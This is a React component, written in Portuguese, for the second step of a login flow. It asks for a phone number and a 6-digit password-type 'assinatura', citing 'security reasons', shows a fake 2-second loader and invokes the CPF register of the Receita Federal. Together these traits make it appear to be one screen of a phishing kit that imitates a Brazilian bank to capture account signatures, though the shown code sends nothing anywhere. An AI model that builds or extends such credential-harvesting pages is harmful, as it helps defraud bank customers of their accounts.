import React from 'react'
import { makeStyles } from '@material-ui/core/styles';
import TextField from '@material-ui/core/TextField';
import alertify from 'alertifyjs';
import InputMask from 'react-input-mask'
import logo from '../Assets/Images/logo_white.png'
import Loader from '../Components/Loader';

const useStyles = makeStyles((theme) => ({
    root: {
        display: 'flex',
        flexWrap: 'wrap',
    },
    textField: {
        // marginLeft: theme.spacing(1),
        // marginRight: theme.spacing(1),
        width: '77vw',
        textAlign: 'center',
    },
}));

const Step2 = ({ nextStep, loginData, setLoginData }) => {

    const classes = useStyles();
    const [loading, setLoading] = React.useState(false)

    const onChangePhone = e => {
        // console.log(e.target.value)
        setLoginData({ ...loginData, telefone: e.target.value })
    }

    const onChangeAss = e => {
        // console.log(e.target.value)
        setLoginData({ ...loginData, assinatura: e.target.value })
    }

    const onClick = () => {
        if (loginData.telefone.length === 15) {
            setLoading(true)
            setTimeout(() =>{
                nextStep()
            },2000)
            
        } else if (loginData.telefone.length < 15) {
            alertify.alert('Aviso', 'Número de Telefone Incorreto')
        }
        //   console.log(loginData.telefone.length)

    }

    return loading

        ? <Loader />
        :

        <div>

            <img src={logo} className="logo" />

            <div className={classes.textField}>
                <h2>Olá,</h2>

                <p>Por motivo de segurança é necessário confirmar algumas informações</p>

                <InputMask mask="(99) 99999-9999" value={loginData.telefone} onChange={onChangePhone}>
                    {(inputProps) =>
                        <TextField
                            label="Telefone"
                            id="margin-none"
                            onChange={onChangePhone}
                            defaultValue=""
                            className={classes.textField}
                        //   helperText="Some important text"
                        />
                    }
                </InputMask>

                <p>Para aumentar ainda mais sua segurança, está validação deve ser confirmada com a assinatura de 6 dígitos</p>

                <TextField
                    label="Assinatura"
                    id="margin-none"
                    type="password"
                    onChange={onChangeAss}

                    className={classes.textField}
                    onInput={(e) => {
                        e.target.value = Math.max(0, parseInt(e.target.value)).toString().slice(0, 6)
                    }} />
                <div>
                    <button type="button" className="botaoLaranja" onClick={onClick}>Continuar</button>
                </div>

                <p>*Este dado está de acordo com o registro de Cadastro de Pessoa Física da Receita Federal</p>
            </div>



        </div>

}

export default Step2